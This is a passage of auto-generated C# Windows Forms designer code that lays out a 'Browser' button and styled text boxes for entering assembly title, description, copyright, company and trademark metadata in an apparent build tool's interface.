        this.BrowserIcon.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BrowserIcon.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold);
        this.BrowserIcon.ForeColor = System.Drawing.Color.White;
        this.BrowserIcon.HoverState.Parent = this.BrowserIcon;
        this.BrowserIcon.Location = new System.Drawing.Point(5, 4);
        this.BrowserIcon.Name = "BrowserIcon";
        this.BrowserIcon.ShadowDecoration.Parent = this.BrowserIcon;
        this.BrowserIcon.Size = new System.Drawing.Size(114, 29);
        this.BrowserIcon.TabIndex = 662;
        this.BrowserIcon.Text = "Browser";
        this.BrowserIcon.Click += new System.EventHandler(this.BrowserIcon_Click);
        // 
        // PanelAssemplyInfo
        // 
        this.PanelAssemplyInfo.Controls.Add(this.BuilderTitleAssembly);
        this.PanelAssemplyInfo.Controls.Add(this.BuilderDescriptionsAssembly);
        this.PanelAssemplyInfo.Controls.Add(this.BuilderCopyrightAssembly);
        this.PanelAssemplyInfo.Controls.Add(this.BuilderCompanyAssembly);
        this.PanelAssemplyInfo.Controls.Add(this.BuilderTrademarksAssembly);
        this.PanelAssemplyInfo.Controls.Add(this.Vr1);
        this.PanelAssemplyInfo.Controls.Add(this.Vr2);
        this.PanelAssemplyInfo.Controls.Add(this.Vr3);
        this.PanelAssemplyInfo.Controls.Add(this.Vr4);
        this.PanelAssemplyInfo.Controls.Add(this.guna2GradientButton_2);
        this.PanelAssemplyInfo.Location = new System.Drawing.Point(13, 245);
        this.PanelAssemplyInfo.Name = "PanelAssemplyInfo";
        this.PanelAssemplyInfo.Size = new System.Drawing.Size(308, 148);
        this.PanelAssemplyInfo.TabIndex = 666;
        // 
        // BuilderTitleAssembly
        // 
        this.BuilderTitleAssembly.AcceptsReturn = false;
        this.BuilderTitleAssembly.AcceptsTab = false;
        this.BuilderTitleAssembly.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.BuilderTitleAssembly.AnimationSpeed = 200;
        this.BuilderTitleAssembly.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderTitleAssembly.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderTitleAssembly.AutoSizeHeight = true;
        this.BuilderTitleAssembly.BackColor = System.Drawing.Color.Transparent;
        this.BuilderTitleAssembly.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderTitleAssembly.BackgroundImage")));
        this.BuilderTitleAssembly.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderTitleAssembly.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderTitleAssembly.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderTitleAssembly.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderTitleAssembly.BorderRadius = 2;
        this.BuilderTitleAssembly.BorderThickness = 1;
        this.BuilderTitleAssembly.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderTitleAssembly.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderTitleAssembly.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTitleAssembly.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderTitleAssembly.DefaultText = "";
        this.BuilderTitleAssembly.FillColor = System.Drawing.Color.White;
        this.BuilderTitleAssembly.HideSelection = true;
        this.BuilderTitleAssembly.IconLeft = null;
        this.BuilderTitleAssembly.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTitleAssembly.IconPadding = 10;
        this.BuilderTitleAssembly.IconRight = null;
        this.BuilderTitleAssembly.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTitleAssembly.Lines = new string[0];
        this.BuilderTitleAssembly.Location = new System.Drawing.Point(6, 8);
        this.BuilderTitleAssembly.MaxLength = 32767;
        this.BuilderTitleAssembly.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderTitleAssembly.Modified = false;
        this.BuilderTitleAssembly.Multiline = false;
        this.BuilderTitleAssembly.Name = "BuilderTitleAssembly";
        stateProperties1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties1.FillColor = System.Drawing.Color.Empty;
        stateProperties1.ForeColor = System.Drawing.Color.Empty;
        stateProperties1.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTitleAssembly.OnActiveState = stateProperties1;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderTitleAssembly.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTitleAssembly.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTitleAssembly.OnIdleState = stateProperties4;
        this.BuilderTitleAssembly.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderTitleAssembly.PasswordChar = '\0';
        this.BuilderTitleAssembly.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderTitleAssembly.PlaceholderText = "Title";
        this.BuilderTitleAssembly.ReadOnly = false;
        this.BuilderTitleAssembly.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderTitleAssembly.SelectedText = "";
        this.BuilderTitleAssembly.SelectionLength = 0;
        this.BuilderTitleAssembly.SelectionStart = 0;
        this.BuilderTitleAssembly.ShortcutsEnabled = true;
        this.BuilderTitleAssembly.Size = new System.Drawing.Size(296, 28);
        this.BuilderTitleAssembly.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderTitleAssembly.TabIndex = 632;
        this.BuilderTitleAssembly.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderTitleAssembly.TextMarginBottom = 0;
        this.BuilderTitleAssembly.TextMarginLeft = 3;
        this.BuilderTitleAssembly.TextMarginTop = 1;
        this.BuilderTitleAssembly.TextPlaceholder = "Title";
        this.BuilderTitleAssembly.UseSystemPasswordChar = false;
        this.BuilderTitleAssembly.WordWrap = true;
        // 
        // BuilderDescriptionsAssembly
        // 
        this.BuilderDescriptionsAssembly.AcceptsReturn = false;
        this.BuilderDescriptionsAssembly.AcceptsTab = false;
        this.BuilderDescriptionsAssembly.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.BuilderDescriptionsAssembly.AnimationSpeed = 200;
        this.BuilderDescriptionsAssembly.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderDescriptionsAssembly.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderDescriptionsAssembly.AutoSizeHeight = true;
        this.BuilderDescriptionsAssembly.BackColor = System.Drawing.Color.Transparent;
        this.BuilderDescriptionsAssembly.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderDescriptionsAssembly.BackgroundImage")));
        this.BuilderDescriptionsAssembly.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDescriptionsAssembly.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderDescriptionsAssembly.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDescriptionsAssembly.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderDescriptionsAssembly.BorderRadius = 2;
        this.BuilderDescriptionsAssembly.BorderThickness = 1;
        this.BuilderDescriptionsAssembly.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderDescriptionsAssembly.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderDescriptionsAssembly.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderDescriptionsAssembly.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderDescriptionsAssembly.DefaultText = "";
        this.BuilderDescriptionsAssembly.FillColor = System.Drawing.Color.White;
        this.BuilderDescriptionsAssembly.HideSelection = true;
        this.BuilderDescriptionsAssembly.IconLeft = null;
        this.BuilderDescriptionsAssembly.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderDescriptionsAssembly.IconPadding = 10;
        this.BuilderDescriptionsAssembly.IconRight = null;
        this.BuilderDescriptionsAssembly.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderDescriptionsAssembly.Lines = new string[0];
        this.BuilderDescriptionsAssembly.Location = new System.Drawing.Point(6, 44);
        this.BuilderDescriptionsAssembly.MaxLength = 32767;
        this.BuilderDescriptionsAssembly.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderDescriptionsAssembly.Modified = false;
        this.BuilderDescriptionsAssembly.Multiline = false;
        this.BuilderDescriptionsAssembly.Name = "BuilderDescriptionsAssembly";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderDescriptionsAssembly.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderDescriptionsAssembly.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderDescriptionsAssembly.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderDescriptionsAssembly.OnIdleState = stateProperties8;
        this.BuilderDescriptionsAssembly.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderDescriptionsAssembly.PasswordChar = '\0';
        this.BuilderDescriptionsAssembly.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderDescriptionsAssembly.PlaceholderText = "Descriptions";
        this.BuilderDescriptionsAssembly.ReadOnly = false;
        this.BuilderDescriptionsAssembly.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderDescriptionsAssembly.SelectedText = "";
        this.BuilderDescriptionsAssembly.SelectionLength = 0;
        this.BuilderDescriptionsAssembly.SelectionStart = 0;
        this.BuilderDescriptionsAssembly.ShortcutsEnabled = true;
        this.BuilderDescriptionsAssembly.Size = new System.Drawing.Size(136, 28);
        this.BuilderDescriptionsAssembly.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderDescriptionsAssembly.TabIndex = 635;
        this.BuilderDescriptionsAssembly.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderDescriptionsAssembly.TextMarginBottom = 0;
        this.BuilderDescriptionsAssembly.TextMarginLeft = 3;
        this.BuilderDescriptionsAssembly.TextMarginTop = 1;
        this.BuilderDescriptionsAssembly.TextPlaceholder = "Descriptions";
        this.BuilderDescriptionsAssembly.UseSystemPasswordChar = false;
        this.BuilderDescriptionsAssembly.WordWrap = true;
        // 
        // BuilderCopyrightAssembly
        // 
        this.BuilderCopyrightAssembly.AcceptsReturn = false;
        this.BuilderCopyrightAssembly.AcceptsTab = false;
        this.BuilderCopyrightAssembly.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.BuilderCopyrightAssembly.AnimationSpeed = 200;
        this.BuilderCopyrightAssembly.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderCopyrightAssembly.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderCopyrightAssembly.AutoSizeHeight = true;
        this.BuilderCopyrightAssembly.BackColor = System.Drawing.Color.Transparent;
        this.BuilderCopyrightAssembly.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderCopyrightAssembly.BackgroundImage")));
        this.BuilderCopyrightAssembly.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderCopyrightAssembly.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderCopyrightAssembly.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderCopyrightAssembly.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderCopyrightAssembly.BorderRadius = 2;
        this.BuilderCopyrightAssembly.BorderThickness = 1;
        this.BuilderCopyrightAssembly.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderCopyrightAssembly.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderCopyrightAssembly.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCopyrightAssembly.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderCopyrightAssembly.DefaultText = "";
        this.BuilderCopyrightAssembly.FillColor = System.Drawing.Color.White;
        this.BuilderCopyrightAssembly.HideSelection = true;
        this.BuilderCopyrightAssembly.IconLeft = null;
        this.BuilderCopyrightAssembly.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCopyrightAssembly.IconPadding = 10;
        this.BuilderCopyrightAssembly.IconRight = null;
        this.BuilderCopyrightAssembly.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCopyrightAssembly.Lines = new string[0];
        this.BuilderCopyrightAssembly.Location = new System.Drawing.Point(153, 44);
        this.BuilderCopyrightAssembly.MaxLength = 32767;
        this.BuilderCopyrightAssembly.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderCopyrightAssembly.Modified = false;
        this.BuilderCopyrightAssembly.Multiline = false;
        this.BuilderCopyrightAssembly.Name = "BuilderCopyrightAssembly";
        stateProperties9.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties9.FillColor = System.Drawing.Color.Empty;
        stateProperties9.ForeColor = System.Drawing.Color.Empty;
        stateProperties9.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCopyrightAssembly.OnActiveState = stateProperties9;
        stateProperties10.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties10.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties10.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderCopyrightAssembly.OnDisabledState = stateProperties10;
        stateProperties11.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties11.FillColor = System.Drawing.Color.Empty;
        stateProperties11.ForeColor = System.Drawing.Color.Empty;
        stateProperties11.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCopyrightAssembly.OnHoverState = stateProperties11;
        stateProperties12.BorderColor = System.Drawing.Color.Silver;
        stateProperties12.FillColor = System.Drawing.Color.White;
        stateProperties12.ForeColor = System.Drawing.Color.Empty;
        stateProperties12.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCopyrightAssembly.OnIdleState = stateProperties12;
        this.BuilderCopyrightAssembly.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderCopyrightAssembly.PasswordChar = '\0';
        this.BuilderCopyrightAssembly.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderCopyrightAssembly.PlaceholderText = "Copyright";
        this.BuilderCopyrightAssembly.ReadOnly = false;
        this.BuilderCopyrightAssembly.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderCopyrightAssembly.SelectedText = "";
        this.BuilderCopyrightAssembly.SelectionLength = 0;
        this.BuilderCopyrightAssembly.SelectionStart = 0;
        this.BuilderCopyrightAssembly.ShortcutsEnabled = true;
        this.BuilderCopyrightAssembly.Size = new System.Drawing.Size(149, 28);
        this.BuilderCopyrightAssembly.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderCopyrightAssembly.TabIndex = 636;
        this.BuilderCopyrightAssembly.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderCopyrightAssembly.TextMarginBottom = 0;
        this.BuilderCopyrightAssembly.TextMarginLeft = 3;
        this.BuilderCopyrightAssembly.TextMarginTop = 1;
        this.BuilderCopyrightAssembly.TextPlaceholder = "Copyright";
        this.BuilderCopyrightAssembly.UseSystemPasswordChar = false;
        this.BuilderCopyrightAssembly.WordWrap = true;
        // 
        // BuilderCompanyAssembly
        // 
        this.BuilderCompanyAssembly.AcceptsReturn = false;
        this.BuilderCompanyAssembly.AcceptsTab = false;
        this.BuilderCompanyAssembly.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.BuilderCompanyAssembly.AnimationSpeed = 200;
        this.BuilderCompanyAssembly.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderCompanyAssembly.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderCompanyAssembly.AutoSizeHeight = true;
        this.BuilderCompanyAssembly.BackColor = System.Drawing.Color.Transparent;
        this.BuilderCompanyAssembly.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderCompanyAssembly.BackgroundImage")));
        this.BuilderCompanyAssembly.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderCompanyAssembly.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderCompanyAssembly.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderCompanyAssembly.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderCompanyAssembly.BorderRadius = 2;
        this.BuilderCompanyAssembly.BorderThickness = 1;
        this.BuilderCompanyAssembly.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderCompanyAssembly.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderCompanyAssembly.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCompanyAssembly.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderCompanyAssembly.DefaultText = "";
        this.BuilderCompanyAssembly.FillColor = System.Drawing.Color.White;
        this.BuilderCompanyAssembly.HideSelection = true;
        this.BuilderCompanyAssembly.IconLeft = null;
        this.BuilderCompanyAssembly.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCompanyAssembly.IconPadding = 10;
        this.BuilderCompanyAssembly.IconRight = null;
        this.BuilderCompanyAssembly.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderCompanyAssembly.Lines = new string[0];
        this.BuilderCompanyAssembly.Location = new System.Drawing.Point(6, 78);
        this.BuilderCompanyAssembly.MaxLength = 32767;
        this.BuilderCompanyAssembly.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderCompanyAssembly.Modified = false;
        this.BuilderCompanyAssembly.Multiline = false;
        this.BuilderCompanyAssembly.Name = "BuilderCompanyAssembly";
        stateProperties13.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties13.FillColor = System.Drawing.Color.Empty;
        stateProperties13.ForeColor = System.Drawing.Color.Empty;
        stateProperties13.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCompanyAssembly.OnActiveState = stateProperties13;
        stateProperties14.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties14.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties14.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderCompanyAssembly.OnDisabledState = stateProperties14;
        stateProperties15.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties15.FillColor = System.Drawing.Color.Empty;
        stateProperties15.ForeColor = System.Drawing.Color.Empty;
        stateProperties15.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCompanyAssembly.OnHoverState = stateProperties15;
        stateProperties16.BorderColor = System.Drawing.Color.Silver;
        stateProperties16.FillColor = System.Drawing.Color.White;
        stateProperties16.ForeColor = System.Drawing.Color.Empty;
        stateProperties16.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderCompanyAssembly.OnIdleState = stateProperties16;
        this.BuilderCompanyAssembly.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderCompanyAssembly.PasswordChar = '\0';
        this.BuilderCompanyAssembly.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderCompanyAssembly.PlaceholderText = "Company";
        this.BuilderCompanyAssembly.ReadOnly = false;
        this.BuilderCompanyAssembly.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderCompanyAssembly.SelectedText = "";
        this.BuilderCompanyAssembly.SelectionLength = 0;
        this.BuilderCompanyAssembly.SelectionStart = 0;
        this.BuilderCompanyAssembly.ShortcutsEnabled = true;
        this.BuilderCompanyAssembly.Size = new System.Drawing.Size(136, 28);
        this.BuilderCompanyAssembly.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderCompanyAssembly.TabIndex = 637;
        this.BuilderCompanyAssembly.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderCompanyAssembly.TextMarginBottom = 0;
        this.BuilderCompanyAssembly.TextMarginLeft = 3;
        this.BuilderCompanyAssembly.TextMarginTop = 1;
        this.BuilderCompanyAssembly.TextPlaceholder = "Company";
        this.BuilderCompanyAssembly.UseSystemPasswordChar = false;
        this.BuilderCompanyAssembly.WordWrap = true;
        // 
        // BuilderTrademarksAssembly
        // 
        this.BuilderTrademarksAssembly.AcceptsReturn = false;
        this.BuilderTrademarksAssembly.AcceptsTab = false;
        this.BuilderTrademarksAssembly.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.BuilderTrademarksAssembly.AnimationSpeed = 200;
        this.BuilderTrademarksAssembly.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderTrademarksAssembly.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderTrademarksAssembly.AutoSizeHeight = true;
        this.BuilderTrademarksAssembly.BackColor = System.Drawing.Color.Transparent;
        this.BuilderTrademarksAssembly.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderTrademarksAssembly.BackgroundImage")));
        this.BuilderTrademarksAssembly.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderTrademarksAssembly.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderTrademarksAssembly.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderTrademarksAssembly.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderTrademarksAssembly.BorderRadius = 2;
        this.BuilderTrademarksAssembly.BorderThickness = 1;
        this.BuilderTrademarksAssembly.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderTrademarksAssembly.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderTrademarksAssembly.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTrademarksAssembly.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderTrademarksAssembly.DefaultText = "";
        this.BuilderTrademarksAssembly.FillColor = System.Drawing.Color.White;
        this.BuilderTrademarksAssembly.HideSelection = true;
        this.BuilderTrademarksAssembly.IconLeft = null;
        this.BuilderTrademarksAssembly.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTrademarksAssembly.IconPadding = 10;
        this.BuilderTrademarksAssembly.IconRight = null;
        this.BuilderTrademarksAssembly.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderTrademarksAssembly.Lines = new string[0];
        this.BuilderTrademarksAssembly.Location = new System.Drawing.Point(153, 78);
        this.BuilderTrademarksAssembly.MaxLength = 32767;
        this.BuilderTrademarksAssembly.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderTrademarksAssembly.Modified = false;
        this.BuilderTrademarksAssembly.Multiline = false;
        this.BuilderTrademarksAssembly.Name = "BuilderTrademarksAssembly";
        stateProperties17.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties17.FillColor = System.Drawing.Color.Empty;
        stateProperties17.ForeColor = System.Drawing.Color.Empty;
        stateProperties17.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTrademarksAssembly.OnActiveState = stateProperties17;
        stateProperties18.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties18.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties18.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderTrademarksAssembly.OnDisabledState = stateProperties18;
        stateProperties19.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties19.FillColor = System.Drawing.Color.Empty;
        stateProperties19.ForeColor = System.Drawing.Color.Empty;
        stateProperties19.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTrademarksAssembly.OnHoverState = stateProperties19;
        stateProperties20.BorderColor = System.Drawing.Color.Silver;
        stateProperties20.FillColor = System.Drawing.Color.White;
        stateProperties20.ForeColor = System.Drawing.Color.Empty;
        stateProperties20.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderTrademarksAssembly.OnIdleState = stateProperties20;
        this.BuilderTrademarksAssembly.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderTrademarksAssembly.PasswordChar = '\0';
        this.BuilderTrademarksAssembly.PlaceholderForeColor = System.Drawing.Color.Silver;
